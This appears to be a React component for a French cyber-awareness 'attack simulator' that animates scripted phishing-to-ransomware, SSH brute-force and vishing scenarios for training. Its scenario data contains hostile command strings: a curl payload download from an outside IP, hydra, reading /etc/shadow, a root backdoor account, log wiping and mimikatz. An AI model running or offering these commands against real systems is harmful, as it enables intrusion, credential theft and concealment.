import React, { useState, useRef, useEffect, useCallback } from 'react';
import { useLocation } from 'wouter';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronLeft, Play, Pause, RotateCcw, Shield, Terminal, AlertTriangle, Wifi } from 'lucide-react';

const T = {
  bg: '#ffffff', surface: '#f7f8fa', line: '#e8eaed',
  blue: '#006a9e', red: '#ef4444', green: '#10b981', amber: '#f59e0b', orange: '#f97316',
  text: '#0f172a', sub: '#64748b', muted: '#94a3b8',
  MONO: "'JetBrains Mono', monospace",
  SANS: "'Plus Jakarta Sans', sans-serif",
};

type StepType = 'cursor' | 'terminal' | 'alert' | 'log' | 'done' | 'screen';

interface Step {
  delay: number;
  type: StepType;
  cmd?: string;
  msg?: string;
  level?: 'info' | 'warn' | 'crit';
  to?: { x: number; y: number };
  screen?: string;
}

interface Scenario {
  id: string;
  label: string;
  sub: string;
  icon: React.FC<{ size: number; color: string }>;
  color: string;
  steps: Step[];
  duration: number;
}

const SCENARIOS: Scenario[] = [
  {
    id: 'phishing',
    label: 'PHISHING → RANSOMWARE',
    sub: 'Email piégé → payload → chiffrement',
    icon: ({ size, color }) => <AlertTriangle size={size} color={color} />,
    color: T.red,
    duration: 16000,
    steps: [
      { delay: 0,     type: 'screen',   screen: 'email',    msg: 'Ouverture de la boîte mail...' },
      { delay: 800,   type: 'cursor',   to: { x: 52, y: 38 }, msg: 'Survol email suspect' },
      { delay: 1800,  type: 'log',      level: 'info', msg: 'Email reçu: "Votre facture #INV-2024-089 - ACTION REQUISE"' },
      { delay: 2500,  type: 'cursor',   to: { x: 48, y: 55 }, msg: 'Clic sur pièce jointe' },
      { delay: 3200,  type: 'screen',   screen: 'download' },
      { delay: 3800,  type: 'log',      level: 'warn', msg: 'Téléchargement: facture_2024.exe (déguisé en .pdf)' },
      { delay: 4500,  type: 'cursor',   to: { x: 35, y: 70 }, msg: 'Double-clic sur le fichier' },
      { delay: 5200,  type: 'terminal', cmd: '$ cmd.exe /c powershell -enc JABzAD0ATgBlAHcA...' },
      { delay: 6000,  type: 'alert',    level: 'warn', msg: '⚠ Windows Defender désactivé via registre' },
      { delay: 6800,  type: 'terminal', cmd: '$ curl -s http://185.220.101.47/stage2.exe -o %TEMP%\\svchost32.exe' },
      { delay: 7800,  type: 'terminal', cmd: '$ find C:\\Users -name "*.docx" -o -name "*.xlsx" -o -name "*.jpg"' },
      { delay: 8800,  type: 'log',      level: 'warn', msg: '3,847 fichiers identifiés pour chiffrement' },
      { delay: 9500,  type: 'cursor',   to: { x: 60, y: 45 }, msg: 'Accès aux fichiers Documents' },
      { delay: 10200, type: 'terminal', cmd: '$ openssl enc -aes-256-cbc -pbkdf2 -in files.tar -out files.enc -k $KEY' },
      { delay: 11200, type: 'screen',   screen: 'encrypting' },
      { delay: 11800, type: 'alert',    level: 'crit', msg: '🔴 CRITIQUE: Chiffrement de 3,847 fichiers en cours (67%)...' },
      { delay: 13000, type: 'terminal', cmd: '$ echo "YOUR FILES ARE ENCRYPTED. Pay 0.8 BTC to 3Fk9mR..." > RANSOM_NOTE.txt' },
      { delay: 14000, type: 'screen',   screen: 'ransom' },
      { delay: 14800, type: 'log',      level: 'crit', msg: 'Contact C2: POST https://185.220.101.47/beacon — clé envoyée' },
      { delay: 16000, type: 'done',     msg: 'Attaque terminée. 3,847 fichiers chiffrés. Rançon demandée : 0.8 BTC.' },
    ],
  },
  {
    id: 'bruteforce',
    label: 'BRUTE FORCE SSH',
    sub: 'Scan réseau → wordlist → escalade root',
    icon: ({ size, color }) => <Terminal size={size} color={color} />,
    color: T.amber,
    duration: 15000,
    steps: [
      { delay: 0,     type: 'screen',   screen: 'terminal' },
      { delay: 500,   type: 'terminal', cmd: '$ nmap -sV -p 22 192.168.1.0/24 --open' },
      { delay: 1500,  type: 'log',      level: 'info', msg: 'Scan réseau: 254 hôtes analysés' },
      { delay: 2200,  type: 'log',      level: 'warn', msg: 'Port 22/SSH ouvert détecté: 192.168.1.42 (OpenSSH 7.4)' },
      { delay: 3000,  type: 'terminal', cmd: '$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.42 ssh' },
      { delay: 4000,  type: 'cursor',   to: { x: 40, y: 40 }, msg: 'Attaque dictionnaire en cours' },
      { delay: 4500,  type: 'log',      level: 'info', msg: '[HYDRA] Tentative 1/14344: admin:password — ÉCHEC' },
      { delay: 5200,  type: 'log',      level: 'info', msg: '[HYDRA] Tentative 847/14344: admin:admin123 — ÉCHEC' },
      { delay: 6000,  type: 'log',      level: 'info', msg: '[HYDRA] Tentative 2891/14344: admin:welcome1 — ÉCHEC' },
      { delay: 7000,  type: 'alert',    level: 'warn', msg: '⚠ Aucune alerte côté serveur — pas de fail2ban configuré' },
      { delay: 8000,  type: 'log',      level: 'crit', msg: '🔴 [HYDRA] Tentative 5021/14344: admin:Summer2019! — SUCCÈS' },
      { delay: 8800,  type: 'terminal', cmd: '$ ssh admin@192.168.1.42 -p 22' },
      { delay: 9500,  type: 'screen',   screen: 'ssh_connected' },
      { delay: 10000, type: 'cursor',   to: { x: 55, y: 60 }, msg: 'Connexion établie' },
      { delay: 10500, type: 'terminal', cmd: '$ sudo -l && sudo su -' },
      { delay: 11500, type: 'log',      level: 'crit', msg: '🔴 Escalade de privilèges: accès ROOT obtenu' },
      { delay: 12200, type: 'terminal', cmd: '$ cat /etc/shadow && crontab -e && useradd -ou 0 -g 0 backdoor' },
      { delay: 13200, type: 'alert',    level: 'crit', msg: '🔴 CRITIQUE: Backdoor persistante installée sur 192.168.1.42' },
      { delay: 14200, type: 'terminal', cmd: '$ history -c && rm -rf /var/log/auth.log' },
      { delay: 15000, type: 'done',     msg: 'Accès root obtenu. Backdoor installée. Logs effacés.' },
    ],
  },
  {
    id: 'social',
    label: 'SOCIAL ENGINEERING',
    sub: 'Usurpation identité → credentials → VPN',
    icon: ({ size, color }) => <Wifi size={size} color={color} />,
    color: '#8b5cf6',
    duration: 14000,
    steps: [
      { delay: 0,     type: 'screen',   screen: 'phone' },
      { delay: 600,   type: 'log',      level: 'info', msg: 'Appel entrant: "+33 1 40 00 XX XX" (numéro usurpé DSI)' },
      { delay: 1400,  type: 'cursor',   to: { x: 50, y: 45 }, msg: 'La victime décroche' },
      { delay: 2200,  type: 'log',      level: 'warn', msg: '"Bonjour, ici le support informatique. Votre compte est compromis."' },
      { delay: 3200,  type: 'log',      level: 'warn', msg: '"J\'ai besoin de vérifier votre identité. Votre login ?"' },
      { delay: 4200,  type: 'log',      level: 'crit', msg: '🔴 Victime communique: login = "m.dupont@entreprise.fr"' },
      { delay: 5000,  type: 'cursor',   to: { x: 35, y: 55 }, msg: 'Prise de note des credentials' },
      { delay: 5800,  type: 'log',      level: 'warn', msg: '"Pour sécuriser votre compte, donnez-moi le code reçu par SMS."' },
      { delay: 7000,  type: 'log',      level: 'crit', msg: '🔴 Victime communique code MFA: "482 917"' },
      { delay: 7800,  type: 'terminal', cmd: '$ python3 aitm_proxy.py --target m.dupont@entreprise.fr --code 482917' },
      { delay: 8600,  type: 'screen',   screen: 'vpn_login' },
      { delay: 9200,  type: 'alert',    level: 'crit', msg: '🔴 Connexion VPN réussie avec credentials volés + MFA bypassed' },
      { delay: 10000, type: 'terminal', cmd: '$ net user /domain && net group "Domain Admins" /domain' },
      { delay: 11000, type: 'log',      level: 'crit', msg: '🔴 Accès au SI interne. Cartographie Active Directory en cours.' },
      { delay: 12000, type: 'terminal', cmd: '$ mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit' },
      { delay: 13000, type: 'alert',    level: 'crit', msg: '🔴 CRITIQUE: Hash NTLM des comptes admin extraits' },
      { delay: 14000, type: 'done',     msg: 'Credentials volés. VPN infiltré. Active Directory compromis.' },
    ],
  },
];

interface LogEntry { time: string; level: 'info' | 'warn' | 'crit'; msg: string; }

function pad(n: number) { return String(n).padStart(2, '0'); }
function timestamp() {
  const d = new Date();
  return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

const LEVEL_COLOR: Record<string, string> = {
  info: T.sub,
  warn: T.amber,
  crit: T.red,
};
const LEVEL_LABEL: Record<string, string> = {
  info: 'INFO',
  warn: 'WARN',
  crit: 'CRIT',
};

function DesktopScreen({ screen, terminalLines, alert }: {
  screen: string;
  terminalLines: string[];
  alert: { msg: string; level: string } | null;
}) {
  const screens: Record<string, React.ReactNode> = {
    email: (
      <div style={{ padding: 12, color: '#c9d1d9', fontFamily: T.MONO, fontSize: 11 }}>
        <div style={{ background: '#161b22', border: '1px solid #30363d', borderRadius: 4, marginBottom: 8, overflow: 'hidden' }}>
          <div style={{ background: '#21262d', padding: '6px 12px', borderBottom: '1px solid #30363d', fontSize: 10, color: '#8b949e' }}>
            📧 Boîte de réception — m.dupont@entreprise.fr
          </div>
          <div style={{ padding: 12 }}>
            {[
              { from: 'factures@secure-invoice.ru', subj: '⚠ Votre facture #INV-2024-089 — ACTION REQUISE', badge: '🔴 NON LU', time: '09:14' },
              { from: 'it-support@entreprise.fr', subj: 'Maintenance prévue ce soir', badge: '', time: '08:30' },
              { from: 'newsletter@linkedin.com', subj: 'Vos nouvelles connexions cette semaine', badge: '', time: '07:45' },
            ].map((m, i) => (
              <div key={i} style={{
                padding: '8px 0', borderBottom: '1px solid #30363d',
                background: i === 0 ? 'rgba(239,68,68,0.08)' : 'transparent',
                display: 'grid', gridTemplateColumns: '160px 1fr auto', gap: 12, alignItems: 'center',
              }}>
                <span style={{ color: i === 0 ? T.red : '#8b949e', fontSize: 10, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{m.from}</span>
                <span style={{ color: i === 0 ? '#e6edf3' : '#8b949e', fontSize: 10 }}>{m.subj} {m.badge && <span style={{ color: T.red, fontSize: 9 }}>{m.badge}</span>}</span>
                <span style={{ color: '#8b949e', fontSize: 9 }}>{m.time}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    ),
    download: (
      <div style={{ padding: 12, color: '#c9d1d9', fontFamily: T.MONO, fontSize: 11 }}>
        <div style={{ background: '#161b22', border: '1px solid #30363d', borderRadius: 4, padding: 16 }}>
          <div style={{ color: '#e6edf3', marginBottom: 8, fontSize: 12 }}>📎 Pièce jointe</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12, background: '#21262d', padding: 12, borderRadius: 4 }}>
            <span style={{ fontSize: 24 }}>📄</span>
            <div>
              <div style={{ color: '#e6edf3', fontSize: 11 }}>facture_2024.pdf.exe</div>
              <div style={{ color: T.red, fontSize: 9, marginTop: 2 }}>⚠ Extension déguisée — fichier exécutable</div>
            </div>
          </div>
          <div style={{ marginTop: 12, background: '#0d1117', borderRadius: 4, padding: 8 }}>
            <div style={{ color: T.green, fontSize: 10, marginBottom: 4 }}>Téléchargement en cours...</div>
            <div style={{ height: 4, background: '#30363d', borderRadius: 2 }}>
              <motion.div
                initial={{ width: 0 }}
                animate={{ width: '100%' }}
                transition={{ duration: 1.2 }}
                style={{ height: '100%', background: T.red, borderRadius: 2 }}
              />
            </div>
          </div>
        </div>
      </div>
    ),
    encrypting: (
      <div style={{ padding: 16, color: '#c9d1d9', fontFamily: T.MONO, fontSize: 11 }}>
        <div style={{ textAlign: 'center', marginBottom: 16 }}>
          <motion.div
            animate={{ opacity: [1, 0.3, 1] }}
            transition={{ repeat: Infinity, duration: 0.8 }}
            style={{ color: T.red, fontSize: 13, fontWeight: 700 }}
          >
            🔐 CHIFFREMENT EN COURS...
          </motion.div>
          <div style={{ color: '#8b949e', fontSize: 10, marginTop: 4 }}>AES-256-CBC | 3,847 fichiers</div>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 4 }}>
          {Array.from({ length: 16 }).map((_, i) => (
            <motion.div
              key={i}
              initial={{ background: '#30363d' }}
              animate={{ background: [T.amber, T.red, '#1a0000'] }}
              transition={{ delay: i * 0.12, duration: 0.6 }}
              style={{ height: 20, borderRadius: 2, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 8, color: '#fff' }}
            >
              {['DOC', 'XLS', 'JPG', 'PDF', 'PPT', 'ZIP', 'PSD', 'MP4', 'MOV', 'CSV', 'SQL', 'BAK', 'TXT', 'PNG', 'RAW', 'KEY'][i]}
            </motion.div>
          ))}
        </div>
      </div>
    ),
    ransom: (
      <div style={{ padding: 16, background: '#0d0000', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ textAlign: 'center', border: '2px solid #ef4444', padding: 20, maxWidth: 280 }}>
          <div style={{ fontSize: 28, marginBottom: 8 }}>🔒</div>
          <div style={{ color: T.red, fontFamily: T.MONO, fontSize: 13, fontWeight: 700, marginBottom: 8 }}>VOS FICHIERS ONT ÉTÉ CHIFFRÉS</div>
          <div style={{ color: '#c9d1d9', fontFamily: T.MONO, fontSize: 9, marginBottom: 12, lineHeight: 1.6 }}>
            Tous vos documents, photos et bases de données sont chiffrés.<br />
            Pour récupérer vos fichiers, envoyez 0.8 BTC à :
          </div>
          <div style={{ color: T.amber, fontFamily: T.MONO, fontSize: 9, background: '#1a0000', padding: 8, wordBreak: 'break-all', marginBottom: 12 }}>
            3Fk9mRxT7vQpNs2wJ8cLdHyBg5AeUiMo
          </div>
          <div style={{ color: '#c9d1d9', fontFamily: T.MONO, fontSize: 9 }}>Délai: <span style={{ color: T.red }}>72 heures</span></div>
        </div>
      </div>
    ),
    terminal: (
      <div style={{ padding: 12, color: '#c9d1d9', fontFamily: T.MONO, fontSize: 11 }}>
        <div style={{ color: T.green, marginBottom: 8, fontSize: 10 }}>root@kali:~# <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }}>█</motion.span></div>
      </div>
    ),
    ssh_connected: (
      <div style={{ padding: 12, color: '#c9d1d9', fontFamily: T.MONO, fontSize: 10 }}>
        <div style={{ color: T.green }}>OpenSSH_7.4p1, OpenSSL 1.0.2k-fips</div>
        <div style={{ color: '#8b949e', marginTop: 4 }}>Warning: Permanently added '192.168.1.42' to known hosts.</div>
        <div style={{ color: T.amber, marginTop: 4 }}>Last login: Mon Dec 09 08:30:21 2024</div>
        <div style={{ color: T.green, marginTop: 8 }}>[admin@srv-prod ~]$ <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }}>█</motion.span></div>
      </div>
    ),
    phone: (
      <div style={{ padding: 16, display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%' }}>
        <div style={{ textAlign: 'center' }}>
          <motion.div
            animate={{ scale: [1, 1.08, 1] }}
            transition={{ repeat: Infinity, duration: 1.2 }}
            style={{ fontSize: 36, marginBottom: 12 }}
          >📱</motion.div>
          <div style={{ color: T.green, fontFamily: T.MONO, fontSize: 12, fontWeight: 700 }}>APPEL ENTRANT</div>
          <div style={{ color: '#c9d1d9', fontFamily: T.MONO, fontSize: 10, marginTop: 4 }}>+33 1 40 00 XX XX</div>
          <div style={{ color: '#8b949e', fontFamily: T.MONO, fontSize: 9, marginTop: 2 }}>DSI — Support Informatique</div>
          <div style={{ color: T.red, fontFamily: T.MONO, fontSize: 8, marginTop: 8 }}>⚠ Numéro usurpé</div>
        </div>
      </div>
    ),
    vpn_login: (
      <div style={{ padding: 16, display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%' }}>
        <div style={{ background: '#161b22', border: `1px solid ${T.green}`, padding: 20, width: '100%', maxWidth: 260 }}>
          <div style={{ color: T.green, fontFamily: T.MONO, fontSize: 11, marginBottom: 12, textAlign: 'center' }}>✓ CONNEXION VPN RÉUSSIE</div>
          <div style={{ fontFamily: T.MONO, fontSize: 9, color: '#8b949e' }}>
            <div>Utilisateur: m.dupont@entreprise.fr</div>
            <div style={{ marginTop: 4 }}>IP assignée: 10.0.0.47</div>
            <div style={{ marginTop: 4 }}>Durée de session: active</div>
            <div style={{ marginTop: 4, color: T.red }}>MFA: bypassé (AiTM)</div>
          </div>
        </div>
      </div>
    ),
  };

  return (
    <div style={{ position: 'relative', width: '100%', height: '100%', background: '#0d1117', overflow: 'hidden' }}>
      {/* Title bar */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 10px', background: '#161b22', borderBottom: '1px solid #30363d' }}>
        <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
        <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#febc2e' }} />
        <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#28c840' }} />
        <span style={{ fontFamily: T.MONO, fontSize: 9, color: '#8b949e', marginLeft: 8 }}>session — bash</span>
      </div>

      {/* Screen content */}
      <div style={{ height: 'calc(100% - 27px)', overflow: 'hidden' }}>
        <AnimatePresence mode="wait">
          <motion.div
            key={screen}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3 }}
            style={{ height: '100%' }}
          >
            {/* Terminal lines always visible at bottom */}
            {screen === 'terminal' || screen === 'ssh_connected' ? (
              <div style={{ padding: 12, fontFamily: T.MONO, fontSize: 10, color: '#c9d1d9', height: '100%', overflowY: 'auto' }}>
                {terminalLines.map((line, i) => (
                  <div key={i} style={{ marginBottom: 4, color: i === terminalLines.length - 1 ? T.green : '#8b949e' }}>
                    {line}
                  </div>
                ))}
                <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }} style={{ color: T.green }}>█</motion.span>
              </div>
            ) : (
              <>
                {screens[screen] || screens['terminal']}
                {/* Overlay terminal lines */}
                {terminalLines.length > 0 && (
                  <div style={{
                    position: 'absolute', bottom: 0, left: 0, right: 0,
                    background: 'rgba(13,17,23,0.95)', padding: 8,
                    borderTop: '1px solid #30363d', maxHeight: 80, overflowY: 'auto',
                  }}>
                    {terminalLines.slice(-3).map((line, i) => (
                      <div key={i} style={{ fontFamily: T.MONO, fontSize: 9, color: i === Math.min(terminalLines.length, 3) - 1 ? T.green : '#8b949e', marginBottom: 2 }}>
                        {line}
                      </div>
                    ))}
                  </div>
                )}
              </>
            )}
          </motion.div>
        </AnimatePresence>
      </div>

      {/* Alert overlay */}
      <AnimatePresence>
        {alert && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            style={{
              position: 'absolute', top: 36, left: 8, right: 8,
              background: alert.level === 'crit' ? 'rgba(239,68,68,0.15)' : 'rgba(245,158,11,0.15)',
              border: `1px solid ${alert.level === 'crit' ? T.red : T.amber}`,
              padding: '6px 10px',
              fontFamily: T.MONO, fontSize: 9,
              color: alert.level === 'crit' ? T.red : T.amber,
              zIndex: 20,
            }}
          >
            {alert.msg}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function AttackSimulator() {
  const [, navigate] = useLocation();
  const [selectedId, setSelectedId] = useState('phishing');
  const [status, setStatus] = useState<'idle' | 'running' | 'paused' | 'done'>('idle');
  const [progress, setProgress] = useState(0);
  const [cursorPos, setCursorPos] = useState({ x: 20, y: 20 });
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [currentScreen, setCurrentScreen] = useState('terminal');
  const [activeAlert, setActiveAlert] = useState<{ msg: string; level: string } | null>(null);

  const timeoutsRef = useRef<ReturnType<typeof setTimeout>[]>([]);
  const startTimeRef = useRef<number>(0);
  const logEndRef = useRef<HTMLDivElement>(null);

  const scenario = SCENARIOS.find(s => s.id === selectedId)!;

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const addLog = useCallback((level: 'info' | 'warn' | 'crit', msg: string) => {
    setLogs(prev => [...prev, { time: timestamp(), level, msg }]);
  }, []);

  const clearAll = useCallback(() => {
    timeoutsRef.current.forEach(clearTimeout);
    timeoutsRef.current = [];
    setStatus('idle');
    setProgress(0);
    setCursorPos({ x: 20, y: 20 });
    setTerminalLines([]);
    setLogs([]);
    setCurrentScreen('terminal');
    setActiveAlert(null);
  }, []);

  const runScenario = useCallback(() => {
    clearAll();
    setStatus('running');
    setLogs([{ time: timestamp(), level: 'info', msg: `Simulation démarrée: ${scenario.label}` }]);
    startTimeRef.current = Date.now();

    const dur = scenario.duration;

    // Progress ticker
    const tick = setInterval(() => {
      const elapsed = Date.now() - startTimeRef.current;
      const p = Math.min((elapsed / dur) * 100, 100);
      setProgress(p);
      if (p >= 100) clearInterval(tick);
    }, 100);
    timeoutsRef.current.push(tick as unknown as ReturnType<typeof setTimeout>);

    scenario.steps.forEach(step => {
      const t = setTimeout(() => {
        if (step.type === 'cursor' && step.to) {
          setCursorPos(step.to);
        }
        if (step.type === 'terminal' && step.cmd) {
          setTerminalLines(prev => [...prev, step.cmd!]);
        }
        if (step.type === 'alert') {
          setActiveAlert({ msg: step.msg!, level: step.level || 'warn' });
          const hide = setTimeout(() => setActiveAlert(null), 3000);
          timeoutsRef.current.push(hide);
        }
        if (step.type === 'log' && step.msg) {
          addLog(step.level || 'info', step.msg);
        }
        if (step.type === 'screen' && step.screen) {
          setCurrentScreen(step.screen);
          if (step.msg) addLog('info', step.msg);
        }
        if (step.type === 'done') {
          setStatus('done');
          setProgress(100);
          addLog('crit', step.msg!);
        }
      }, step.delay);
      timeoutsRef.current.push(t);
    });
  }, [scenario, clearAll, addLog]);

  const handleSelect = (id: string) => {
    clearAll();
    setSelectedId(id);
  };

  return (
    <div style={{ minHeight: '100vh', background: T.bg, fontFamily: T.SANS, color: T.text }}>
      <style>{`@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');`}</style>

      <div style={{ maxWidth: 1200, margin: '0 auto', padding: '40px 32px 80px' }}>

        {/* Back */}
        <button
          onClick={() => navigate('/cyber/sas-academie')}
          style={{ display: 'flex', alignItems: 'center', gap: 6, background: 'none', border: 'none', cursor: 'pointer', color: T.muted, fontSize: 10, fontFamily: T.MONO, letterSpacing: '0.06em', marginBottom: 36, padding: 0 }}
        >
          <ChevronLeft size={12} /> Retour Cyber Académie
        </button>

        {/* Header */}
        <div style={{ marginBottom: 32 }}>
          <span style={{ fontFamily: T.MONO, fontSize: 10, textTransform: 'uppercase', letterSpacing: '0.12em', color: T.blue, display: 'block', marginBottom: 6 }}>
            MISE EN SITUATION TECHNIQUE
          </span>
          <h1 style={{ fontFamily: T.SANS, fontSize: 'clamp(1.4rem, 2.5vw, 1.9rem)', fontWeight: 700, letterSpacing: '-0.03em', color: T.text, margin: '0 0 6px' }}>
            Cyber Attack Simulator
          </h1>
          <p style={{ fontSize: 13, color: T.sub, margin: 0, lineHeight: 1.6 }}>
            Visualisez en temps réel comment se déroule une attaque cyber et comprenez les mécanismes d'intrusion.
          </p>
        </div>

        {/* Scenario selector */}
        <div style={{ display: 'flex', gap: 1, background: T.line, marginBottom: 24 }}>
          {SCENARIOS.map(s => {
            const Icon = s.icon;
            const active = s.id === selectedId;
            return (
              <button
                key={s.id}
                onClick={() => handleSelect(s.id)}
                style={{
                  flex: 1, padding: '14px 16px', background: active ? T.bg : T.surface,
                  border: 'none', cursor: 'pointer', textAlign: 'left',
                  borderBottom: active ? `2px solid ${s.color}` : '2px solid transparent',
                  transition: 'all 0.12s ease',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 3 }}>
                  <Icon size={12} color={active ? s.color : T.muted} />
                  <span style={{ fontFamily: T.MONO, fontSize: 9, fontWeight: 600, letterSpacing: '0.06em', color: active ? s.color : T.muted }}>
                    {s.label}
                  </span>
                </div>
                <div style={{ fontFamily: T.SANS, fontSize: 11, color: active ? T.sub : T.muted }}>{s.sub}</div>
              </button>
            );
          })}
        </div>

        {/* Progress bar */}
        <div style={{ height: 3, background: T.line, marginBottom: 24, position: 'relative' }}>
          <motion.div
            style={{ height: '100%', background: scenario.color, transformOrigin: 'left' }}
            animate={{ width: `${progress}%` }}
            transition={{ duration: 0.1 }}
          />
        </div>

        {/* Main area */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 320px', gap: 1, background: T.line, height: 440 }}>

          {/* Desktop screen */}
          <div style={{ background: T.bg, position: 'relative', overflow: 'hidden' }}>
            <DesktopScreen screen={currentScreen} terminalLines={terminalLines} alert={activeAlert} />

            {/* Ghost cursor */}
            <AnimatePresence>
              {status === 'running' && (
                <motion.div
                  style={{
                    position: 'absolute',
                    width: 14, height: 14,
                    borderRadius: '50%',
                    background: 'rgba(239,68,68,0.85)',
                    border: '2px solid #ef4444',
                    boxShadow: '0 0 8px rgba(239,68,68,0.6)',
                    pointerEvents: 'none',
                    zIndex: 30,
                    top: `${cursorPos.y}%`,
                    left: `${cursorPos.x}%`,
                    transform: 'translate(-50%, -50%)',
                  }}
                  animate={{ top: `${cursorPos.y}%`, left: `${cursorPos.x}%` }}
                  transition={{ duration: 0.9, ease: 'easeInOut' }}
                />
              )}
            </AnimatePresence>
          </div>

          {/* Event log */}
          <div style={{ background: T.bg, display: 'flex', flexDirection: 'column' }}>
            <div style={{ padding: '10px 14px', borderBottom: `1px solid ${T.line}`, display: 'flex', alignItems: 'center', gap: 8 }}>
              <Shield size={11} color={T.muted} />
              <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', color: T.muted, letterSpacing: '0.08em' }}>
                LOG D'ÉVÉNEMENTS
              </span>
            </div>
            <div style={{ flex: 1, overflowY: 'auto', padding: '8px 0' }}>
              <AnimatePresence>
                {logs.map((log, i) => (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: 8 }}
                    animate={{ opacity: 1, x: 0 }}
                    style={{ padding: '5px 14px', borderBottom: `1px solid ${T.line}` }}
                  >
                    <div style={{ display: 'flex', gap: 8, alignItems: 'flex-start' }}>
                      <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.muted, flexShrink: 0, marginTop: 1 }}>{log.time}</span>
                      <span style={{
                        fontFamily: T.MONO, fontSize: 8, color: '#fff',
                        background: LEVEL_COLOR[log.level], padding: '1px 4px',
                        flexShrink: 0, marginTop: 1,
                      }}>
                        {LEVEL_LABEL[log.level]}
                      </span>
                      <span style={{ fontFamily: T.MONO, fontSize: 9, color: log.level === 'crit' ? T.red : log.level === 'warn' ? T.amber : T.sub, lineHeight: 1.5 }}>
                        {log.msg}
                      </span>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
              {logs.length === 0 && (
                <div style={{ padding: '20px 14px', fontFamily: T.MONO, fontSize: 9, color: T.muted, textAlign: 'center' }}>
                  En attente de lancement...
                </div>
              )}
              <div ref={logEndRef} />
            </div>
          </div>
        </div>

        {/* Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginTop: 16 }}>
          {status === 'idle' || status === 'done' ? (
            <button
              onClick={runScenario}
              style={{
                display: 'flex', alignItems: 'center', gap: 8,
                padding: '10px 24px', background: scenario.color, color: '#fff',
                border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 11, fontWeight: 600,
              }}
            >
              <Play size={12} />
              {status === 'done' ? 'REJOUER' : 'LANCER LA SIMULATION'}
            </button>
          ) : (
            <button
              onClick={clearAll}
              style={{
                display: 'flex', alignItems: 'center', gap: 8,
                padding: '10px 24px', background: T.surface, color: T.sub,
                border: `1px solid ${T.line}`, cursor: 'pointer', fontFamily: T.MONO, fontSize: 11,
              }}
            >
              <Pause size={12} /> ARRÊTER
            </button>
          )}

          <button
            onClick={clearAll}
            style={{
              display: 'flex', alignItems: 'center', gap: 6,
              padding: '10px 16px', background: T.surface, color: T.muted,
              border: `1px solid ${T.line}`, cursor: 'pointer', fontFamily: T.MONO, fontSize: 11,
            }}
          >
            <RotateCcw size={11} /> RESET
          </button>

          {status === 'done' && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              style={{
                marginLeft: 'auto', fontFamily: T.MONO, fontSize: 10,
                color: T.red, display: 'flex', alignItems: 'center', gap: 6,
              }}
            >
              <AlertTriangle size={11} /> Simulation terminée — {scenario.steps.find(s => s.type === 'done')?.msg}
            </motion.div>
          )}

          {status === 'running' && (
            <span style={{ marginLeft: 'auto', fontFamily: T.MONO, fontSize: 10, color: T.muted }}>
              {Math.round(progress)}% — simulation en cours
            </span>
          )}
        </div>

      </div>
    </div>
  );
}
